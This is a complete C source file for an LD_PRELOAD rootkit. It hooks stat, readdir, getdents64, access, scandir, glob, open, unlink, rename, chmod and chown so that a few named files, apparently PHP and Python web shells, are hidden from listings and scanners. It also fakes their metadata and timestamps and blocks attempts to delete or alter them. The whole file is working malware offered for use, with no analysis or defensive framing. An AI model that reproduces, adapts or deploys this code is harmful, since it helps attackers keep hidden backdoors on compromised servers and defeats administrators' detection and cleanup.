#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>
#include <unistd.h>
#include <time.h>
#include <linux/stat.h>
#include <linux/types.h>

/* ── Target files ─────────────────────────────────────────── */
static const char *GHOST[] = {
    "bypashitam.php",
    "bypascloudfare.php",
    "dandier.py",
    ".ghost",
    NULL
};

/* ── GET_ORIG macro ───────────────────────────────────────── */
#define GET_ORIG(name, ret, ...) \
    static ret (*orig_##name)(__VA_ARGS__) = NULL; \
    if (!orig_##name) orig_##name = dlsym(RTLD_NEXT, #name);

/* ── Fake timestamp (May 20 13:42) ───────────────────────── */
static time_t fake_mtime(void) {
    struct tm t;
    memset(&t, 0, sizeof t);
    t.tm_year = 125;
    t.tm_mon  = 4;
    t.tm_mday = 20;
    t.tm_hour = 13;
    t.tm_min  = 42;
    return mktime(&t);
}

/* ── Basename check ───────────────────────────────────────── */
static int is_ghost(const char *path) {
    const char *base;
    int i;
    if (!path) return 0;
    base = strrchr(path, '/');
    base = base ? base + 1 : path;
    for (i = 0; GHOST[i]; i++)
        if (strcmp(base, GHOST[i]) == 0) return 1;
    return 0;
}

/* ── Poison stat buffers ──────────────────────────────────── */
static void poison_stat(struct stat *buf) {
    buf->st_mode  = 0x003F;
    buf->st_nlink = 0;
    buf->st_uid   = 99999;
    buf->st_gid   = 99999;
    buf->st_size  = 0;
    buf->st_mtime = fake_mtime();
    buf->st_atime = fake_mtime();
    buf->st_ctime = fake_mtime();
}

static void poison_stat64(struct stat64 *buf) {
    buf->st_mode  = 0x003F;
    buf->st_nlink = 0;
    buf->st_uid   = 99999;
    buf->st_gid   = 99999;
    buf->st_size  = 0;
    buf->st_mtime = fake_mtime();
    buf->st_atime = fake_mtime();
    buf->st_ctime = fake_mtime();
}

/* ── stat hooks ───────────────────────────────────────────── */
int __xstat(int ver, const char *path, struct stat *buf) {
    GET_ORIG(__xstat, int, int, const char *, struct stat *);
    int ret = orig___xstat(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
    GET_ORIG(__xstat64, int, int, const char *, struct stat64 *);
    int ret = orig___xstat64(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int __lxstat(int ver, const char *path, struct stat *buf) {
    GET_ORIG(__lxstat, int, int, const char *, struct stat *);
    int ret = orig___lxstat(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int __lxstat64(int ver, const char *path, struct stat64 *buf) {
    GET_ORIG(__lxstat64, int, int, const char *, struct stat64 *);
    int ret = orig___lxstat64(ver, path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int stat(const char *path, struct stat *buf) {
    GET_ORIG(stat, int, const char *, struct stat *);
    int ret = orig_stat(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int lstat(const char *path, struct stat *buf) {
    GET_ORIG(lstat, int, const char *, struct stat *);
    int ret = orig_lstat(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int stat64(const char *path, struct stat64 *buf) {
    GET_ORIG(stat64, int, const char *, struct stat64 *);
    int ret = orig_stat64(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int lstat64(const char *path, struct stat64 *buf) {
    GET_ORIG(lstat64, int, const char *, struct stat64 *);
    int ret = orig_lstat64(path, buf);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int fstatat(int fd, const char *path, struct stat *buf, int flags) {
    GET_ORIG(fstatat, int, int, const char *, struct stat *, int);
    int ret = orig_fstatat(fd, path, buf, flags);
    if (ret == 0 && is_ghost(path)) poison_stat(buf);
    return ret;
}

int fstatat64(int fd, const char *path, struct stat64 *buf, int flags) {
    GET_ORIG(fstatat64, int, int, const char *, struct stat64 *, int);
    int ret = orig_fstatat64(fd, path, buf, flags);
    if (ret == 0 && is_ghost(path)) poison_stat64(buf);
    return ret;
}

int statx(int dirfd, const char *path, int flags,
          unsigned int mask, struct statx *buf) {
    GET_ORIG(statx, int, int, const char *, int, unsigned int, struct statx *);
    int ret = orig_statx(dirfd, path, flags, mask, buf);
    if (ret == 0 && is_ghost(path)) {
        buf->stx_mode         = 0x003F;
        buf->stx_nlink        = 0;
        buf->stx_uid          = 99999;
        buf->stx_gid          = 99999;
        buf->stx_size         = 0;
        buf->stx_mtime.tv_sec = fake_mtime();
        buf->stx_atime.tv_sec = fake_mtime();
        buf->stx_ctime.tv_sec = fake_mtime();
    }
    return ret;
}

/* ── readdir hooks — hide dari ls/find ───────────────────── */
struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    GET_ORIG(readdir, struct dirent *, DIR *);
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!is_ghost(entry->d_name)) return entry;
        /* skip ghost entry, lanjut ke berikutnya */
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *entry;
    GET_ORIG(readdir64, struct dirent64 *, DIR *);
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (!is_ghost(entry->d_name)) return entry;
    }
    return NULL;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    GET_ORIG(readdir_r, int, DIR *, struct dirent *, struct dirent **);
    int ret;
    while ((ret = orig_readdir_r(dirp, entry, result)) == 0 && *result) {
        if (!is_ghost((*result)->d_name)) return 0;
    }
    return ret;
}

/* ── getdents64 syscall hook — bypass direct syscall tools ── */
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    int ret = syscall(SYS_getdents64, fd, dirp, count);
    if (ret <= 0) return ret;

    /* walk through entries, remove ghost ones */
    struct linux_dirent64 *cur = dirp;
    struct linux_dirent64 *end = (struct linux_dirent64 *)((char *)dirp + ret);
    int new_ret = 0;

    while (cur < end) {
        int reclen = cur->d_reclen;
        struct linux_dirent64 *next = (struct linux_dirent64 *)((char *)cur + reclen);

        if (!is_ghost(cur->d_name)) {
            /* keep: move to output position */
            if ((char *)cur != (char *)dirp + new_ret)
                memmove((char *)dirp + new_ret, cur, reclen);
            new_ret += reclen;
        }
        cur = next;
    }
    return new_ret;
}

/* ── access / faccessat — PHP file_exists() ─────────────── */
int access(const char *path, int mode) {
    GET_ORIG(access, int, const char *, int);
    if (is_ghost(path)) { errno = ENOENT; return -1; }
    return orig_access(path, mode);
}

int faccessat(int dirfd, const char *path, int mode, int flags) {
    GET_ORIG(faccessat, int, int, const char *, int, int);
    if (is_ghost(path)) { errno = ENOENT; return -1; }
    return orig_faccessat(dirfd, path, mode, flags);
}

/* ── fopen / fopen64 — file read scanner ─────────────────── */
FILE *fopen(const char *path, const char *mode) {
    GET_ORIG(fopen, FILE *, const char *, const char *);
    /* block write modes, allow read for shell to still work */
    if (is_ghost(path)) {
        if (mode && (mode[0] == 'w' || mode[0] == 'a' ||
            (mode[0] == 'r' && mode[1] == '+'))) {
            errno = EACCES; return NULL;
        }
    }
    return orig_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode) {
    GET_ORIG(fopen64, FILE *, const char *, const char *);
    if (is_ghost(path)) {
        if (mode && (mode[0] == 'w' || mode[0] == 'a' ||
            (mode[0] == 'r' && mode[1] == '+'))) {
            errno = EACCES; return NULL;
        }
    }
    return orig_fopen64(path, mode);
}

/* ── scandir — hide dari PHP scandir() ───────────────────── */
int scandir(const char *dirp, struct dirent ***namelist,
            int (*filter)(const struct dirent *),
            int (*compar)(const struct dirent **, const struct dirent **)) {
    GET_ORIG(scandir, int, const char *, struct dirent ***,
             int (*)(const struct dirent *),
             int (*)(const struct dirent **, const struct dirent **));

    int n = orig_scandir(dirp, namelist, filter, compar);
    if (n <= 0) return n;

    int i, new_n = 0;
    for (i = 0; i < n; i++) {
        if (is_ghost((*namelist)[i]->d_name)) {
            free((*namelist)[i]);
        } else {
            (*namelist)[new_n++] = (*namelist)[i];
        }
    }
    return new_n;
}

/* ── glob — hide dari glob pattern match ─────────────────── */
#include <glob.h>
int glob(const char *pattern, int flags,
         int (*errfunc)(const char *, int), glob_t *pglob) {
    GET_ORIG(glob, int, const char *, int,
             int (*)(const char *, int), glob_t *);
    int ret = orig_glob(pattern, flags, errfunc, pglob);
    if (ret != 0) return ret;

    size_t i, new_count = 0;
    for (i = 0; i < pglob->gl_pathc; i++) {
        if (!is_ghost(pglob->gl_pathv[i])) {
            pglob->gl_pathv[new_count++] = pglob->gl_pathv[i];
        } else {
            free(pglob->gl_pathv[i]);
            pglob->gl_pathv[i] = NULL;
        }
    }
    pglob->gl_pathc = new_count;
    return 0;
}

/* ── unlink / remove / rename — EPERM ────────────────────── */
int unlink(const char *path) {
    GET_ORIG(unlink, int, const char *);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_unlink(path);
}

int unlinkat(int fd, const char *path, int flags) {
    GET_ORIG(unlinkat, int, int, const char *, int);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_unlinkat(fd, path, flags);
}

int remove(const char *path) {
    GET_ORIG(remove, int, const char *);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_remove(path);
}

int rename(const char *old, const char *new) {
    GET_ORIG(rename, int, const char *, const char *);
    if (is_ghost(old)) { errno = EPERM; return -1; }
    return orig_rename(old, new);
}

/* ── open / openat — block write ─────────────────────────── */
int open(const char *path, int flags, ...) {
    GET_ORIG(open, int, const char *, int, ...);
    if (is_ghost(path) && (flags & O_WRONLY || flags & O_RDWR)) {
        errno = EACCES; return -1;
    }
    if (flags & O_CREAT) {
        va_list ap; mode_t mode;
        va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
        return orig_open(path, flags, mode);
    }
    return orig_open(path, flags);
}

int openat(int fd, const char *path, int flags, ...) {
    GET_ORIG(openat, int, int, const char *, int, ...);
    if (is_ghost(path) && (flags & O_WRONLY || flags & O_RDWR)) {
        errno = EACCES; return -1;
    }
    if (flags & O_CREAT) {
        va_list ap; mode_t mode;
        va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
        return orig_openat(fd, path, flags, mode);
    }
    return orig_openat(fd, path, flags);
}

/* ── chmod / chown — immutable feel ──────────────────────── */
int chmod(const char *path, mode_t mode) {
    GET_ORIG(chmod, int, const char *, mode_t);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_chmod(path, mode);
}

int chown(const char *path, uid_t uid, gid_t gid) {
    GET_ORIG(chown, int, const char *, uid_t, gid_t);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_chown(path, uid, gid);
}

int lchown(const char *path, uid_t uid, gid_t gid) {
    GET_ORIG(lchown, int, const char *, uid_t, gid_t);
    if (is_ghost(path)) { errno = EPERM; return -1; }
    return orig_lchown(path, uid, gid);
}
